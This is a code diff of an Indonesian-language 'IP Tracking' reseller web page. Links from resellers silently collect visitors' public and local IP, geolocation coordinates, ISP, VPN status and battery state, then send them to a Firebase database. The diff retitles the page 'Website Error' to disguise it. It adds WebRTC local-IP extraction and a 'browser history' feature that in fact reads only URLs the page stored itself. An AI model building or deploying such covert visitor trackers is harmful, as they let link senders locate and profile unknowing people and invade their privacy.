@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Tracking System</title>
+    <title>Website Error</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
     <style>
@@ -294,6 +294,45 @@
         .hidden {
             display: none;
         }
+        
+        .battery-info {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+        }
+        
+        .battery-level {
+            width: 100px;
+            height: 20px;
+            background-color: var(--darker-color);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-right: 10px;
+        }
+        
+        .battery-fill {
+            height: 100%;
+            background-color: var(--primary-color);
+            border-radius: 10px;
+        }
+        
+        .history-list {
+            max-height: 150px;
+            overflow-y: auto;
+            background-color: var(--darker-color);
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 5px;
+        }
+        
+        .history-item {
+            padding: 5px;
+            border-bottom: 1px solid var(--light-grey);
+        }
+        
+        .history-item:last-child {
+            border-bottom: none;
+        }
     </style>
 </head>
 <body>
@@ -301,9 +340,9 @@
         <!-- Header untuk Reseller -->
         <header id="resellerHeader" class="hidden">
             <div class="container header-content">
-                <div class="logo">IP Tracking Reseller</div>
+                <div class="logo">i don't know</div>
                 <div id="authButtons" class="auth-buttons">
-                    <button class="btn btn-primary" onclick="showLoginModal()">Login Reseller</button>
+                    <button class="btn btn-primary" onclick="showLoginModal()">Login</button>
                 </div>
                 <div id="userInfo" class="user-info" style="display: none;">
                     <span class="welcome-text" id="welcomeText"></span>
@@ -315,7 +354,7 @@
         <!-- Halaman Login Reseller -->
         <div id="loginPage" class="login-container hidden">
             <div class="login-form">
-                <h2 class="login-title">Reseller Login</h2>
+                <h2 class="login-title">Login</h2>
                 <div class="form-group">
                     <label for="loginUsername">Username</label>
                     <input type="text" id="loginUsername" class="form-control" placeholder="Masukkan username">
@@ -750,7 +789,8 @@
                     const visitor = snapshot.val();
                     
                     let detailsHTML = `
-                        <div class="info-item"><span class="info-label">IP Address:</span> ${visitor.ip}</div>
+                        <div class="info-item"><span class="info-label">IP Public:</span> ${visitor.ip}</div>
+                        <div class="info-item"><span class="info-label">IP Local:</span> ${visitor.localIP || 'Tidak tersedia'}</div>
                         <div class="info-item"><span class="info-label">Lokasi:</span> ${visitor.country}, ${visitor.city}, ${visitor.region} ${visitor.postal}</div>
                         <div class="info-item"><span class="info-label">Koordinat:</span> ${visitor.latitude}, ${visitor.longitude}</div>
                         <div class="info-item"><span class="info-label">ISP:</span> ${visitor.isp}</div>
@@ -759,8 +799,46 @@
                         <div class="info-item"><span class="info-label">Jenis Koneksi:</span> ${visitor.connectionType}</div>
                         <div class="info-item"><span class="info-label">Reverse DNS:</span> ${visitor.reverseDNS}</div>
                         <div class="info-item"><span class="info-label">Proxy/VPN:</span> ${visitor.vpn ? 'Ya' : 'Tidak'}</div>
-                        <div class="info-item"><span class="info-label">Waktu:</span> ${new Date(visitor.timestamp).toLocaleString('id-ID')}</div>
                     `;
+                    
+                    // Tambahkan info baterai jika tersedia
+                    if (visitor.batteryInfo) {
+                        detailsHTML += `
+                            <div class="info-item">
+                                <span class="info-label">Status Baterai:</span> 
+                                ${visitor.batteryInfo.level * 100}% 
+                                ${visitor.batteryInfo.charging ? '(Sedang diisi)' : ''}
+                                <div class="battery-info">
+                                    <div class="battery-level">
+                                        <div class="battery-fill" style="width: ${visitor.batteryInfo.level * 100}%"></div>
+                                    </div>
+                                    ${visitor.batteryInfo.level * 100}%
+                                </div>
+                            </div>
+                        `;
+                    }
+                    
+                    // Tambahkan riwayat browsing jika tersedia
+                    if (visitor.browserHistory && visitor.browserHistory.length > 0) {
+                        detailsHTML += `
+                            <div class="info-item">
+                                <span class="info-label">Riwayat Browser:</span>
+                                <div class="history-list">
+                        `;
+                        
+                        visitor.browserHistory.forEach((item, index) => {
+                            if (index < 10) { // Tampilkan maksimal 10 item
+                                detailsHTML += `<div class="history-item">${item}</div>`;
+                            }
+                        });
+                        
+                        detailsHTML += `
+                                </div>
+                            </div>
+                        `;
+                    }
+                    
+                    detailsHTML += `<div class="info-item"><span class="info-label">Waktu:</span> ${new Date(visitor.timestamp).toLocaleString('id-ID')}</div>`;
                     
                     document.getElementById('visitorDetails').innerHTML = detailsHTML;
                     document.getElementById('visitorModal').style.display = 'flex';
@@ -786,7 +864,8 @@
                     
                     let textData = `DATA PENGUNJUNG IP TRACKING\n`;
                     textData += `============================\n\n`;
-                    textData += `IP Address: ${visitor.ip}\n`;
+                    textData += `IP Public: ${visitor.ip}\n`;
+                    textData += `IP Local: ${visitor.localIP || 'Tidak tersedia'}\n`;
                     textData += `Lokasi: ${visitor.country}, ${visitor.city}, ${visitor.region} ${visitor.postal}\n`;
                     textData += `Koordinat: ${visitor.latitude}, ${visitor.longitude}\n`;
                     textData += `ISP: ${visitor.isp}\n`;
@@ -795,6 +874,20 @@
                     textData += `Jenis Koneksi: ${visitor.connectionType}\n`;
                     textData += `Reverse DNS: ${visitor.reverseDNS}\n`;
                     textData += `Proxy/VPN: ${visitor.vpn ? 'Ya' : 'Tidak'}\n`;
+                    
+                    if (visitor.batteryInfo) {
+                        textData += `Status Baterai: ${visitor.batteryInfo.level * 100}% ${visitor.batteryInfo.charging ? '(Sedang diisi)' : ''}\n`;
+                    }
+                    
+                    if (visitor.browserHistory && visitor.browserHistory.length > 0) {
+                        textData += `\nRiwayat Browser:\n`;
+                        visitor.browserHistory.forEach((item, index) => {
+                            if (index < 10) {
+                                textData += `- ${item}\n`;
+                            }
+                        });
+                    }
+                    
                     textData += `Waktu: ${new Date(visitor.timestamp).toLocaleString('id-ID')}\n`;
                     
                     const blob = new Blob([textData], { type: 'text/plain' });
@@ -855,12 +948,99 @@
             }
         }
         
+        // Fungsi untuk mendapatkan IP local menggunakan WebRTC
+        function getLocalIP() {
+            return new Promise((resolve) => {
+                // Compatibility for Firefox and Chrome
+                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                const pc = new RTCPeerConnection({iceServers: []});
+                const noop = () => {};
+                
+                pc.createDataChannel('');
+                pc.createOffer(pc.setLocalDescription.bind(pc), noop);
+                
+                pc.onicecandidate = (ice) => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
+                        pc.onicecandidate = noop;
+                        resolve(myIP);
+                    } else {
+                        resolve(null);
+                    }
+                };
+                
+                // Timeout if no candidate found
+                setTimeout(() => {
+                    resolve(null);
+                }, 1000);
+            });
+        }
+        
+        // Fungsi untuk mendapatkan info baterai
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: battery.level,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (error) {
+                    console.error('Error getting battery info:', error);
+                    return null;
+                }
+            } else {
+                return null;
+            }
+        }
+        
+        // Fungsi untuk mendapatkan riwayat browser dari localStorage
+        function getBrowserHistory() {
+            try {
+                const history = JSON.parse(localStorage.getItem('browserHistory') || '[]');
+                return history;
+            } catch (error) {
+                console.error('Error getting browser history:', error);
+                return [];
+            }
+        }
+        
+        // Fungsi untuk menyimpan riwayat browser ke localStorage
+        function saveToBrowserHistory(url) {
+            try {
+                const history = JSON.parse(localStorage.getItem('browserHistory') || '[]');
+                
+                // Tambahkan URL baru jika belum ada dalam riwayat
+                if (!history.includes(url)) {
+                    history.push(url);
+                    
+                    // Simpan maksimal 50 item
+                    if (history.length > 50) {
+                        history.shift();
+                    }
+                    
+                    localStorage.setItem('browserHistory', JSON.stringify(history));
+                }
+            } catch (error) {
+                console.error('Error saving to browser history:', error);
+            }
+        }
+        
         // Fungsi utama untuk mengumpulkan dan mengirim data (mode pengunjung)
         async function collectAndSendData(resellerId, linkId) {
             const ipInfo = await getIPInfo();
             if (!ipInfo) return;
             
             const isVPN = await checkVPN(ipInfo.ip);
+            const localIP = await getLocalIP();
+            const batteryInfo = await getBatteryInfo();
+            
+            // Dapatkan dan simpan riwayat browser
+            const currentUrl = window.location.href;
+            saveToBrowserHistory(currentUrl);
+            const browserHistory = getBrowserHistory();
             
             const userAgent = navigator.userAgent;
             const language = navigator.language;
@@ -868,6 +1048,7 @@
             
             const data = {
                 ip: ipInfo.ip,
+                localIP: localIP,
                 country: ipInfo.country_name,
                 city: ipInfo.city,
                 region: ipInfo.region,
@@ -882,11 +1063,13 @@
                 reverseDNS: ipInfo.reverse || '',
                 connectionType: ipInfo.connection_type || '',
                 timestamp: new Date().toISOString(),
-                visitedPages: [window.location.href]
+                visitedPages: [currentUrl],
+                batteryInfo: batteryInfo,
+                browserHistory: browserHistory
             };
             
             // Simpan data ke Firebase
-            const refPath = `resellers/${resellerId}/links/${linkId}/visitors/${data.ip.replace(/\./g, '-')}`;
+            const refPath = `resellers/${resellerId}/links/${linkId}/visitors/${data.ip.replace(/\./g, '-')}_${Date.now()}`;
             database.ref(refPath).set(data)
                 .then(() => {
                     console.log('Data successfully sent to Firebase');
